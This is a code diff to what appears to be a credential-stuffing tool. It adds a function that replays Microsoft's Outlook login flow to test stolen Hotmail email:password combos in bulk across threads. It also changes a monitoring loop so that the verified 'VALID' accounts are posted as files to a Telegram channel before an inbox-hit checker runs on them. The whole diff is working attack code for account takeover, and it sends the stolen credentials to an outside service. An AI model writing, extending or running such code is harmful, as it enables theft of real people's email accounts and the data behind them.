@@ -322,6 +322,77 @@ def check_inbox_account(combo: str) -> tuple:
         return (combo, {})
 
 
+def check_valid_account(combo: str) -> tuple:
+    """Check if hotmail account is valid. Returns (combo, True/False)."""
+    import requests, re, uuid, time
+    try:
+        email, password = combo.split(":", 1)
+        session = requests.Session()
+
+        r1 = session.get(
+            f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
+            headers={
+                "X-OneAuth-AppName": "Outlook Lite",
+                "X-Office-Version": "3.11.0-minApi24",
+                "X-CorrelationId": str(uuid.uuid4()),
+                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
+                "Host": "odc.officeapps.live.com",
+                "Connection": "Keep-Alive",
+                "Accept-Encoding": "gzip"
+            }, timeout=15)
+        if "MSAccount" not in r1.text:
+            return (combo, False)
+
+        time.sleep(0.3)
+
+        r2 = session.get(
+            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
+            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+            allow_redirects=True, timeout=15)
+
+        url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
+        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
+        if not url_match or not ppft_match:
+            return (combo, False)
+
+        post_url = url_match.group(1).replace("\\/", "/")
+        ppft     = ppft_match.group(1)
+
+        r3 = session.post(post_url,
+            data=f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960",
+            headers={
+                "Content-Type": "application/x-www-form-urlencoded",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Origin": "https://login.live.com",
+                "Referer": r2.url
+            }, allow_redirects=False, timeout=15)
+
+        if any(x in r3.text for x in ["account or password is incorrect", "Incorrect password", "Invalid credentials", "identity/confirm", "Abuse", "signedout", "locked"]):
+            return (combo, False)
+
+        location   = r3.headers.get("Location", "")
+        code_match = re.search(r'code=([^&]+)', location)
+        if not code_match:
+            return (combo, False)
+
+        return (combo, True)
+
+    except Exception:
+        return (combo, False)
+
+
+async def run_validity_checker(combos: list) -> list:
+    """Check which accounts are valid. Returns list of valid combos."""
+    log.info(f"Checking validity of {len(combos)} hotmail accounts...")
+    loop = asyncio.get_event_loop()
+    with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
+        futures = [loop.run_in_executor(pool, check_valid_account, combo) for combo in combos]
+        results = await asyncio.gather(*futures)
+    valid = [combo for combo, is_valid in results if is_valid]
+    log.info(f"Validity check done — {len(valid)}/{len(combos)} valid")
+    return valid
+
+
 async def run_inbox_checker(combos: list) -> dict:
     """Run inbox checker on all combos. Returns dict of service -> list of combos."""
     log.info(f"Running inbox checker on {len(combos)} combos...")
@@ -586,10 +657,25 @@ async def monitor_loop():
                                 await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                 await asyncio.sleep(0.5)
 
-                            # Run inbox checker and post inbox_hits.zip (hotmail only)
+                            # Validity check + inbox checker (hotmail only)
                             if label == "hotmail":
                                 try:
-                                    service_map = await run_inbox_checker(all_raw)
+                                    # First check which accounts are valid
+                                    valid_accounts = await run_validity_checker(all_raw)
+                                    if valid_accounts:
+                                        # Replace all_raw with only valid accounts
+                                        all_raw = valid_accounts
+                                        combined = ["\n".join(all_raw)]
+                                        chunks = [all_raw]
+                                        # Re-post main file with valid only
+                                        valid_fname = f"[ HOTMAIL ] [ {len(all_raw)} ] [ VALID ] [ @warprivate ].txt"
+                                        await send_telegram_file(tg_header + "\n".join(all_raw), valid_fname)
+                                        log.info(f"Posted {len(all_raw)} valid hotmail accounts")
+                                    else:
+                                        log.info("No valid hotmail accounts found")
+
+                                    # Then run inbox checker on valid accounts only
+                                    service_map = await run_inbox_checker(valid_accounts if valid_accounts else all_raw)
                                     if service_map:
                                         zip_buf = io.BytesIO()
                                         with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
@@ -600,7 +686,7 @@ async def monitor_loop():
                                         await send_telegram_file(zip_buf.read(), zip_name)
                                         log.info(f"Posted inbox_hits.zip with {len(service_map)} service(s)")
                                 except Exception as e:
-                                    log.error(f"Inbox checker failed: {e}")
+                                    log.error(f"Hotmail checker failed: {e}")
 
                             # Post sorted domains ZIP (hotmail only)
                             if label == "hotmail":
